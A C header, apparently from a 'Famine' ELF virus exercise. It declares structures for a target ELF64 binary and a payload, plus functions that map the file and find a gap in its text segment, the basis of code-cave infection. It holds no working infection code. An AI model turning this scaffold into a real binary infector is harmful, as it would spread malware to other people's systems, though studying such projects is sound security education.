
#ifndef FAMINE_H
# define FAMINE_H

#ifndef DEBUG
# define DEBUG 0
#endif

#include <elf.h>

typedef struct s_info
{
	char		*fname;
	void		*mmap;
	int			fd;
	long		fsize;
} t_info;

/* 64 bits target structure */
typedef struct s_elf
{
	char		*fname;
	int			fd;
	long		fsize;
	Elf64_Ehdr	*ehdr;
	Elf64_Phdr	*phdr;
	Elf64_Shdr	*shdr;
	int			len;
	int			base;
	long		text_end;
	long		gap;
} t_elf;

/* 64 bits payload structure */
typedef struct s_payload
{
	t_info		elf;
	Elf64_Shdr	text_section;
}	t_payload;

/* famine.c */
int				elf_open_and_map(t_elf *elf);
Elf64_Phdr *	elf_find_gap(t_elf *target);
unsigned int 	elf_x_section_counter(Elf64_Shdr *shdr, uint64_t shnum);

/* Print elf content */
void			print_headers(t_elf *elf);


#endif
